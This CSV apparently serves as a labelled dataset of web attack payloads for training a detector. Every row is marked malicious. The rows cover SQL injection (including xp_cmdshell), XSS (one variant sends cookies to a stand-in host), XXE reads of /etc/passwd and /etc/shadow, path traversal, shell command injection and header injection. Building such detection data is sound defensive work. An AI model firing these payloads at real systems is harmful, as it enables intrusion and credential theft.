Sentence,Label
 /  / *,1
 / etc / passwd,1
 / etc / shadow,1
 / index.html | id | ,1
0 or 1 = 1,1
0xfffffff,1
1 or 1 in  ( @@version ) --,1
1 or 1 = 1--,1
1 ;  waitfor delay '0:30:0'--,1
1 ; SELECT *,1
1 |  | Utl_Http.request ( 'http :  /   /  < yourservername > ' )  from dual--,1
2147483647,1
268435455,1
:response.write 111111,1
 ;  ping 127.0.0.1  ; ,1
 ;  / usr / bin / id \ n,1
 ; echo 111111,1
 ; id ; ,1
 ; id \ n,1
 ; id | ,1
 ; ls -la,1
 ; system ( ' / usr / bin / id' ) ,1
 ; system ( 'cat  / etc / passwd' ) ,1
 ; system ( 'id' ) ,1
 ;  |  / usr / bin / id | ,1
 <   script  >   <   /  script > ,1
 < ! [ CDATA [  <  ]  ]  > SCRIPT < ! [ CDATA [  >  ]  ]  > alert ( 'XSS' )  ;  < ! [ CDATA [  <  ]  ]  >  / SCRIPT < ! [ CDATA [  >  ]  ]  > ,1
 < ! [ CDATA [  < script > var n = 0 ; while ( true )  { n++ ;  }  <  / script >  ]  ]  > ,1
 <  / foo > ,1
 <  < ,1
 <  <  < ,1
" <  < script > alert ( ""XSS"" )  ;  /  /  <  <  / script > ",1
" <  > ""'% ;  )  (  & +",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM ""file :  /   /  /  / dev / random"" >  ]  >  < foo >  & xxe ;  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM ""file :  /   /  /  / etc / passwd"" >  ]  >  < foo >  & xxe ;  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM ""file :  /   /  /  / etc / shadow"" >  ]  >  < foo >  & xxe ;  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM ""file :  /   / c :  /  boot.ini"" >  ]  >  < foo >  & xxe ;  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < foo >  < ! [ CDATA [ ' or 1 = 1 or '' = ' ]  ]  >  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < foo >  < ! [ CDATA [  <  ]  ]  > SCRIPT < ! [ CDATA [  >  ]  ]  > alert ( 'XSS' )  ;  < ! [ CDATA [  <  ]  ]  >  / SCRIPT < ! [ CDATA [  >  ]  ]  >  <  / foo > ",1
" < HTML xmlns:xss >  < ?import namespace = ""xss"" implementation = ""http :  /   / ha.ckers.org / xss.htc"" >  < xss:xss > XSS <  / xss:xss >  <  / HTML > ",1
" < IMG """""" >  < SCRIPT > alert ( ""XSS"" )  <  / SCRIPT > "" > ",1
" < IMG DYNSRC = ""javascript:alert ( 'XSS' ) "" > ",1
" < IMG LOWSRC = ""javascript:alert ( 'XSS' ) "" > ",1
" < IMG SRC = ""  & #14 ;   javascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""jav	ascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""jav & #x09 ; ascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""jav & #x0A ; ascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""jav & #x0D ; ascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""javascript:alert ( 'XSS' ) """,1
" < IMG SRC = ""javascript:alert ( 'XSS' )  ; "" > ",1
 < IMG SRC =  & #0000106 & #0000097 & #0000118 & #0000097 & #0000115 & #0000099 & #0000114 & #0000105 & #0000112 & #0000116 & #0000058 & #0000097 & #0000108 & #0000101 & #0000114 & #0000116 & #0000040 & #0000039 & #0000088 & #0000083 & #0000083 & #0000039 & #0000041 > ,1
 < IMG SRC =  & #106 ;  & #97 ;  & #118 ;  & #97 ;  & #115 ;  & #99 ;  & #114 ;  & #105 ;  & #112 ;  & #116 ;  & #58 ;  & #97 ;  & #108 ;  & #101 ;  & #114 ;  & #116 ;  & #40 ;  & #39 ;  & #88 ;  & #83 ;  & #83 ;  & #39 ;  & #41 ;  > ,1
 < IMG SRC =  & #x6A & #x61 & #x76 & #x61 & #x73 & #x63 & #x72 & #x69 & #x70 & #x74 & #x3A & #x61 & #x6C & #x65 & #x72 & #x74 & #x28 & #x27 & #x58 & #x53 & #x53 & #x27 & #x29 > ,1
 < IMG SRC = JaVaScRiPt:alert ( 'XSS' )  > ,1
" < IMG SRC = `javascript:alert ( ""'XSS'"" ) ` > ",1
 < IMG SRC = javascript:alert (  & quot ; XSS & quot ;  )  > ,1
 < IMG SRC = javascript:alert ( 'XSS' )  > ,1
" < IMG SRC = javascript:alert ( String.fromCharCode ( 88,83,83  )  )   > ",1
 < IMG SRC = '%26%23x6a ; avasc%26%23000010ript:a%26%23x6c ; ert ( document.%26%23x63 ; ookie ) ' > ,1
 < IMG SRC = 'javasc	ript:alert ( document.cookie ) ' > ,1
 < IMG SRC = 'javascript:alert ( document.cookie ) ' > ,1
 < foo >  <  / foo > ,1
" < name > ',''  )  )   ;  phpinfo (  )  ;  exit ;  / * <  / name > ",1
" < script > alert ( ""XSS"" )  <  / script > ",1
 < script > alert ( document.cookie )  <  / script > ,1
" < xml ID = ""xss"" >  < I >  < B >  & lt ; IMG SRC = ""javas < !-- -- > cript:alert ( 'XSS' ) "" & gt ;  <  / B >  <  / I >  <  / xml >  < SPAN DATASRC = ""#xss"" DATAFLD = ""B"" DATAFORMATAS = ""HTML"" >  <  / SPAN >  <  / C >  <  / X >  <  / xml >  < SPAN DATASRC = #I DATAFLD = C DATAFORMATAS = HTML >  <  / SPAN > ",1
" < xml ID = I >  < X >  < C >  < ! [ CDATA [  < IMG SRC = ""javas ]  ]  >  < ! [ CDATA [ cript:alert ( 'XSS' )  ; "" >  ]  ]  > ",1
" < xml SRC = ""xsstest.xml"" ID = I >  <  / xml >  < SPAN DATASRC = #I DATAFLD = C DATAFORMATAS = HTML >  <  / SPAN > ",1
 < xss >  < script > alert ( 'XSS' )  <  / script >  <  / vulnerable > ,1
 < youremail > %0aBcc: < youremail > ,1
 < youremail > %0aCc: < youremail > ,1
 < youremail > %0d%0aBcc: < youremail > ,1
 < youremail > %0d%0aCc: < youremail > ,1
 =  ; ,1
"?x = """,1
?x =  > ,1
?x =  | ,1
@ & apos ; ,1
@variable,1
ABCD | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | ,1
PRINT @@variable,1
XXXXX.%p,1
"XXXXX`perl -e 'print "".%p"" x 80'`",1
 [  & apos ;  ] ,1
 [ ' ] ,1
" \ "" ; alert ( 'XSS' )  ;  /  / ",1
" \ ""blah",1
 \  & apos ; ,1
  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ etc \ passwd,1
  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ etc \ passwd%00,1
  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ etc \ shadow,1
  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ etc \ shadow%00,1
 \ 00 \ 00,1
 \ 00 \ 00 \ 00,1
 \ 0 \ 0,1
 \ 0 \ 0 \ 0,1
 \  \ ,1
 \  \  & apos ;  / bin / cat  / etc / passwd \  \  & apos ; ,1
 \  \  & apos ;  / bin / cat  / etc / shadow \  \  & apos ; ,1
 \  \  / ,1
 \  \  \  \ *,1
 \  \  \  \ ? \  \ ,1
 \ n / bin / ls -al \ n,1
 \ n / usr / bin / id ; ,1
 \ n / usr / bin / id \ n,1
 \ n / usr / bin / id | ,1
 \ nid ; ,1
 \ nid \ n,1
 \ nid | ,1
 \ nnetstat -a% \ n,1
 \ u003C,1
 \ u003c,1
 \ x23,1
 \ x27,1
 \ x27UNION SELECT,1
 \ x27 \ x4F \ x52 SELECT *,1
 \ x27 \ x6F \ x72 SELECT *,1
 \ x3C,1
 \ x3D  \ x27,1
 \ x3D  \ x3B',1
 \ x3c,1
^ & apos ; ,1
` / usr / bin / id`,1
"`perl -e 'print "".%p"" x 80'`%n",1
`ping 127.0.0.1`,1
a )  ;  / usr / bin / id,1
a )  ;  / usr / bin / id ; ,1
a )  ;  / usr / bin / id | ,1
a )  ; id,1
a )  ; id ; ,1
a )  ; id | ,1
a )  |  / usr / bin / id,1
a )  |  / usr / bin / id ; ,1
a )  | id,1
a )  | id ; ,1
a ;  / usr / bin / id,1
a ;  / usr / bin / id ; ,1
a ;  / usr / bin / id | ,1
a ; id,1
a ; id ; ,1
a ; id | ,1
http :  /   /  < yourservername >  / ,1
id%00 | ,1
insert,1
or 0 = 0 #,1
or 0 = 0 --,1
or 1 = 1--,1
or 1 = 1,1
or 1 = 1 --,1
response.write 111111,1
something%00html,1
update,1
x' or 1 = 1 or 'x' = 'y,1
x' or name (  )  = 'username' or 'x' = 'y,1
xsstest,1
"xsstest%00"" <  > '",1
 {  & apos ;  } ,1
 |  / usr / bin / id,1
 |  / usr / bin / id | ,1
 | id ; ,1
 | id | ,1
 | ls -la,1
 | nid \ n,1
 | usr / bin / id \ n,1
 |  | ,1
 |  |  ping -i 30 127.0.0.1  ;  x  |  |  ping -n 30 127.0.0.1  & ,1
 |  |  / usr / bin / id ; ,1
 |  |  / usr / bin / id | ,1
268435455,1
-268435455,1
2147483647,1
0xfffffff,1
 <   script  >   <   /  script > ,1
 \ 0 \ 0,1
 \ 0 \ 0 \ 0,1
 \ 00 \ 00,1
 \ 00 \ 00 \ 00,1
 \ nnetstat -a% \ n,1
" \ ""blah",1
 | dir | ,1
 & quot ;  ; id & quot ; ,1
dir%00,1
dir%00 | ,1
 | dir,1
 | dir | ,1
 |  / bin / ls -al,1
"?x = """,1
?x =  | ,1
?x =  > ,1
 / boot.ini,1
ABCD | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | %8.8x | ,1
 . .  /   . .  /  boot.ini,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  %2A,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini,1
 / %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt / desktop.ini,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  conf / server.xml,1
C :  /  inetpub / wwwroot / global.asa,1
C :  \  inetpub \ wwwroot \ global.asa,1
C :  /  boot.ini,1
C :  \  boot.ini,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  localstart.asp%00,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  localstart.asp,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  boot.ini%00,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  boot.ini,1
 / . / . / . / . / . / . / . / . / . / . / . / boot.ini,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  boot.ini%00,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  boot.ini,1
 / .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  boot.ini,1
 / . \  \ . / . \  \ . / . \  \ . / . \  \ . / . \  \ . / . \  \ . / boot.ini,1
  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ boot.ini,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ boot.ini%00,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ boot.ini,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  boot.ini%00.html,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  boot.ini%00.jpg,1
 / . . .  /  . . .  /  . . .  /  . . .  /  . . .  /  ,1
..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  boot.ini,1
 / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / boot.ini,1
%0d%0aX-Injection-Header: AttackValue,1
!@#0%^#0##018387@#0^^**  (  (   ) ,1
%01%02%03%04%0a%0d%0aADSF,1
" / ,%ENV, / ",1
 & lt ; !--#exec cmd =  & quot ; dir & quot ; -- & gt ; ,1
 & lt ; !--#exec cmd =  & quot ; dir & quot ; -- & gt ; ,1
 \  \ ,1
 \  \  / ,1
 \  \  \  \ *,1
 \  \  \  \ ? \  \ ,1
 & lt ; ,1
 & LT ; ,1
 <  < ,1
 <  <  < ,1
 |  | ,1
 ( ' ) ,1
 { ' } ,1
 [ ' ] ,1
!@#$%%^#$%#$@#$%$$@#$%^^**  (  (   ) ,1
%01%02%03%04%0a%0d%0aADSF,1
""" \ t""",1
 & #10 ; ,1
 & #13 ; ,1
 & #10 ;  & #13 ; ,1
 & #13 ;  & #10 ; ,1
#xD#xA,1
#xA#xD,1
 / %00 / ,1
%00 / ,1
%3C%3F,1
%5C / ,1
 / %2A,1
 . .  /  ,1
%2e%2e%2f,1
..%u2215,1
..%c0%af,1
..%bg%qf,1
..%%35c,1
..%255c,1
..%%35%63,1
..%25%35%63,1
..%u2216,1
 & #60,1
 & #060,1
 & #0060,1
 & #00060,1
 & #000060,1
 & #0000060,1
 & #60 ; ,1
 & #060 ; ,1
 & #0060 ; ,1
 & #00060 ; ,1
 & #000060 ; ,1
 & #0000060 ; ,1
 & #x3c,1
 & #x03c,1
 & #x003c,1
 & #x0003c,1
 & #x00003c,1
 & #x000003c,1
 & #x3c ; ,1
 & #x03c ; ,1
 & #x003c ; ,1
 & #x0003c ; ,1
 & #x00003c ; ,1
 & #x000003c ; ,1
 & #X3c,1
 & #X03c,1
 & #X003c,1
 & #X0003c,1
 & #X00003c,1
 & #X000003c,1
 & #X3c ; ,1
 & #X03c ; ,1
 & #X003c ; ,1
 & #X0003c ; ,1
 & #X00003c ; ,1
 & #X000003c ; ,1
 & #x3C,1
 & #x03C,1
 & #x003C,1
 & #x0003C,1
 & #x00003C,1
 & #x000003C,1
 & #x3C ; ,1
 & #x03C ; ,1
 & #x003C ; ,1
 & #x0003C ; ,1
 & #x00003C ; ,1
 & #x000003C ; ,1
 & #X3C,1
 & #X03C,1
 & #X003C,1
 & #X0003C,1
 & #X00003C,1
 & #X000003C,1
 & #X3C ; ,1
 & #X03C ; ,1
 & #X003C ; ,1
 & #X0003C ; ,1
 & #X00003C ; ,1
 & #X000003C ; ,1
 \ x3c,1
 \ x3C,1
 \ u003c,1
 \ u003C,1
something%00html,1
 & apos ; ,1
 /  & apos ; ,1
 \  & apos ; ,1
^ & apos ; ,1
@ & apos ; ,1
 {  & apos ;  } ,1
 [  & apos ;  ] ,1
* & apos ; ,1
# & apos ; ,1
""" > xxx < P > yyy",1
""" >  < script > """,1
" < script > alert ( ""XSS"" )  <  / script > ",1
" <  < script > alert ( ""XSS"" )  ;  /  /  <  <  / script > ",1
 < script > alert ( document.cookie )  <  / script > ,1
' >  < script > alert ( document.cookie )  <  / script > ,1
' >  < script > alert ( document.cookie )  ;  <  / script > ,1
" \ "" ; alert ( 'XSS' )  ;  /  / ",1
"%3cscript%3ealert ( ""XSS"" )  ; %3c / script%3e",1
%3cscript%3ealert ( document.cookie )  ; %3c%2fscript%3e,1
%3Cscript%3Ealert ( %22X SS%22 )  ; %3C / script%3E,1
 & ltscript & gtalert ( document.cookie )  ;  <  / script > ,1
 & ltscript & gtalert ( document.cookie )  ;  & ltscript & gtalert,1
 < xss >  < script > alert ( 'XSS' )  <  / script >  <  / vulnerable > ,1
 < IMG SRC = 'javascript:alert ( document.cookie ) ' > ,1
" < IMG SRC = ""javascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""javascript:alert ( 'XSS' ) """,1
 < IMG SRC = javascript:alert ( 'XSS' )  > ,1
 < IMG SRC = JaVaScRiPt:alert ( 'XSS' )  > ,1
 < IMG SRC = javascript:alert (  & quot ; XSS & quot ;  )  > ,1
" < IMG SRC = `javascript:alert ( ""'XSS'"" ) ` > ",1
" < IMG """""" >  < SCRIPT > alert ( ""XSS"" )  <  / SCRIPT > "" > ",1
" < IMG SRC = javascript:alert ( String.fromCharCode ( 88,83,83  )  )   > ",1
 < IMG SRC = 'javasc	ript:alert ( document.cookie ) ' > ,1
" < IMG SRC = ""jav	ascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""jav & #x09 ; ascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""jav & #x0A ; ascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""jav & #x0D ; ascript:alert ( 'XSS' )  ; "" > ",1
" < IMG SRC = ""  & #14 ;   javascript:alert ( 'XSS' )  ; "" > ",1
" < IMG DYNSRC = ""javascript:alert ( 'XSS' ) "" > ",1
" < IMG LOWSRC = ""javascript:alert ( 'XSS' ) "" > ",1
 < IMG SRC = '%26%23x6a ; avasc%26%23000010ript:a%26%23x6c ; ert ( document.%26%23x63 ; ookie ) ' > ,1
 < IMG SRC =  & #106 ;  & #97 ;  & #118 ;  & #97 ;  & #115 ;  & #99 ;  & #114 ;  & #105 ;  & #112 ;  & #116 ;  & #58 ;  & #97 ;  & #108 ;  & #101 ;  & #114 ;  & #116 ;  & #40 ;  & #39 ;  & #88 ;  & #83 ;  & #83 ;  & #39 ;  & #41 ;  > ,1
 < IMG SRC =  & #0000106 & #0000097 & #0000118 & #0000097 & #0000115 & #0000099 & #0000114 & #0000105 & #0000112 & #0000116 & #0000058 & #0000097 & #0000108 & #0000101 & #0000114 & #0000116 & #0000040 & #0000039 & #0000088 & #0000083 & #0000083 & #0000039 & #0000041 > ,1
 < IMG SRC =  & #x6A & #x61 & #x76 & #x61 & #x73 & #x63 & #x72 & #x69 & #x70 & #x74 & #x3A & #x61 & #x6C & #x65 & #x72 & #x74 & #x28 & #x27 & #x58 & #x53 & #x53 & #x27 & #x29 > ,1
'%3CIFRAME SRC = javascript:alert ( %2527XSS%2527 ) %3E%3C / IFRAME%3E,1
""" >  < script > document.location = 'http :  /   / your.site.com / cgi-bin / cookie.cgi?'+document.cookie <  / script > ",1
%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27 %2Bdocument%2Ecookie%3C%2Fscript%3E,1
"' ; alert ( String.fromCharCode ( 88,83,83  )  )   /  /  \ ' ; alert ( String.fromCharCode ( 88,83,83  )  )   /  / "" ; alert ( String.fromCharCode ( 88,83,83  )  )   /  /  \ "" ; alert ( String.fromCharCode ( 88,83,83  )  )   /  /  >  <  / SCRIPT > !-- < SCRIPT > alert ( String.fromCharCode ( 88,83,83  )  )   <  / SCRIPT >  =  &  {  } ",1
"'' ; !--"" < XSS >  =  &  {  (  )  } ",1
--' ; ,1
 =   ; ,1
 =  --,1
 \ x23,1
 \ x27,1
 \ x3D  \ x3B',1
 \ x3D  \ x27,1
 \ x27 \ x4F \ x52 SELECT *,1
 \ x27 \ x6F \ x72 SELECT *,1
'or select *,1
admin'--,1
' ; shutdown--,1
" <  > ""'% ;  )  (  & +",1
' or '' = ',1
' or 'x' = 'x,1
""" or ""x"" = ""x",1
' )  or  ( 'x' = 'x,1
0 or 1 = 1,1
' or 0 = 0 --,1
""" or 0 = 0 --",1
or 0 = 0 --,1
' or 0 = 0 #,1
""" or 0 = 0 #",1
or 0 = 0 #,1
' or 1 = 1--,1
""" or 1 = 1--",1
' or '1' = '1'--,1
"""' or 1 --'""",1
or 1 = 1--,1
or 1 = 1,1
or 1 = 1 --,1
' or 1 = 1 or '' = ',1
""" or 1 = 1 or """" = """,1
' or a = a--,1
""" or ""a"" = ""a",1
' )  or  ( 'a' = 'a,1
""" )  or  ( ""a"" = ""a",1
"hi"" or ""a"" = ""a",1
"hi"" or 1 = 1 --",1
hi' or 1 = 1 --,1
hi' or 'a' = 'a,1
hi' )  or  ( 'a' = 'a,1
"hi"" )  or  ( ""a"" = ""a",1
'hi' or 'x' = 'x' ; ,1
@variable,1
",@variable",1
PRINT @@variable,1
select,1
insert,1
procedure,1
order by,1
delete,1
update,1
distinct,1
having,1
truncate,1
replace,1
handler,1
bfilename,1
' or username like '%,1
' or uname like '%,1
' or userid like '%,1
' or uid like '%,1
' or user like '%,1
exec xp,1
exec sp,1
' ;  exec master..xp_cmdshell,1
' ;  exec xp_regread,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
--sp_password,1
 \ x27UNION SELECT,1
' UNION SELECT,1
' UNION ALL SELECT,1
' or  ( EXISTS ) ,1
'  ( select top 1,1
' |  | UTL_HTTP.REQUEST,1
1 ; SELECT *,1
to_timestamp_tz,1
tz_offset,1
 & lt ;  & gt ;  & quot ; '% ;  )  (  & amp ; +,1
' or 1 = 1,1
%27 or 1 = 1,1
 $ ( sleep 50 ) ,1
 'sleep 50',1
char%4039%41%2b%40SELECT,1
 & apos ;  OR,1
'sqlattempt1,1
 ( sqlattempt2 ) ,1
%2A%7C,1
* (  |  ( mail = *  )  )  ,1
%2A%28%7C%28mail%3D%2A%29%29,1
* (  |  ( objectclass = *  )  )  ,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
' or 1 = 1 or '' = ',1
' or '' = ',1
x' or 1 = 1 or 'x' = 'y,1
 /  / ,1
 /  / *,1
count (  / child::node (   )  )  ,1
x' or name (  )  = 'username' or 'x' = 'y,1
" < name > ',''  )  )   ;  phpinfo (  )  ;  exit ;  / * <  / name > ",1
 < ! [ CDATA [  < script > var n = 0 ; while ( true )  { n++ ;  }  <  / script >  ]  ]  > ,1
 < ! [ CDATA [  <  ]  ]  > SCRIPT < ! [ CDATA [  >  ]  ]  > alert ( 'XSS' )  ;  < ! [ CDATA [  <  ]  ]  >  / SCRIPT < ! [ CDATA [  >  ]  ]  > ,1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < foo >  < ! [ CDATA [  <  ]  ]  > SCRIPT < ! [ CDATA [  >  ]  ]  > alert ( 'XSS' )  ;  < ! [ CDATA [  <  ]  ]  >  / SCRIPT < ! [ CDATA [  >  ]  ]  >  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < foo >  < ! [ CDATA [ ' or 1 = 1 or '' = ' ]  ]  >  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM ""file :  /   / c :  /  boot.ini"" >  ]  >  < foo >  & xxe ;  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM ""file :  /   /  /  / etc / passwd"" >  ]  >  < foo >  & xxe ;  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM ""file :  /   /  /  / etc / shadow"" >  ]  >  < foo >  & xxe ;  <  / foo > ",1
" < ?xml version = ""1.0"" encoding = ""ISO-8859-1""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM ""file :  /   /  /  / dev / random"" >  ]  >  < foo >  & xxe ;  <  / foo > ",1
" < xml ID = I >  < X >  < C >  < ! [ CDATA [  < IMG SRC = ""javas ]  ]  >  < ! [ CDATA [ cript:alert ( 'XSS' )  ; "" >  ]  ]  > ",1
" < xml ID = ""xss"" >  < I >  < B >  & lt ; IMG SRC = ""javas < !-- -- > cript:alert ( 'XSS' ) "" & gt ;  <  / B >  <  / I >  <  / xml >  < SPAN DATASRC = ""#xss"" DATAFLD = ""B"" DATAFORMATAS = ""HTML"" >  <  / SPAN >  <  / C >  <  / X >  <  / xml >  < SPAN DATASRC = #I DATAFLD = C DATAFORMATAS = HTML >  <  / SPAN > ",1
" < xml SRC = ""xsstest.xml"" ID = I >  <  / xml >  < SPAN DATASRC = #I DATAFLD = C DATAFORMATAS = HTML >  <  / SPAN > ",1
" < HTML xmlns:xss >  < ?import namespace = ""xss"" implementation = ""http :  /   / ha.ckers.org / xss.htc"" >  < xss:xss > XSS <  / xss:xss >  <  / HTML > ",1
' or 1 = 1--,1
1 or 1 = 1--,1
' or 1 in  ( @@version ) --,1
1 or 1 in  ( @@version ) --,1
' ;  waitfor delay '0:30:0'--,1
1 ;  waitfor delay '0:30:0'--,1
' |  | Utl_Http.request ( 'http :  /   /  < yourservername > ' )  from dual--,1
1 |  | Utl_Http.request ( 'http :  /   /  < yourservername > ' )  from dual--,1
xsstest,1
"xsstest%00"" <  > '",1
 <  / foo > ,1
 < foo >  <  / foo > ,1
  )  )    )  )    )  )    )  )    )  )  ,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  boot.ini,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ boot.ini,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  windows / win.ini,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ windows \ win.ini,1
 |  |  ping -i 30 127.0.0.1  ;  x  |  |  ping -n 30 127.0.0.1  & ,1
 |  ping -i 30 127.0.0.1  | ,1
 |  ping -n 30 127.0.0.1  | ,1
 &  ping -i 30 127.0.0.1  & ,1
 &  ping -n 30 127.0.0.1  & ,1
 ;  ping 127.0.0.1  ; ,1
%0a ping -i 30 127.0.0.1 %0a,1
`ping 127.0.0.1`,1
 ; echo 111111,1
echo 111111,1
response.write 111111,1
:response.write 111111,1
http :  /   /  < yourservername >  / ,1
 < youremail > %0aCc: < youremail > ,1
 < youremail > %0d%0aCc: < youremail > ,1
 < youremail > %0aBcc: < youremail > ,1
 < youremail > %0d%0aBcc: < youremail > ,1
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+ < youremail > %0aRCPT+TO:+ < youremail > %0aDATA%0aFrom:+ < youremail > %0aTo:+ < youremail > %0aSubject:+tst%0afoo%0a%2e%0a,1
